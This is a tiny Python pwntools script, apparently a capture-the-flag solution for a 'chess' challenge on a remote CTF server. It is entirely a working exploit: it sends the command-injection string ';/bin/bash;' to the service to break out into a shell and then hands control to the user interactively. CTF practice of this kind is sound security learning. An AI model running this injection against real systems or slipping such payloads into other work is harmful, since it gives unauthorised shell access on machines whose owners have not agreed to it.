from pwn import *

#p = process("./chess")
p = remote("ctf-league.osusec.org", 31314)

p.sendline(";/bin/bash;")
p.sendline("exit")

p.interactive()
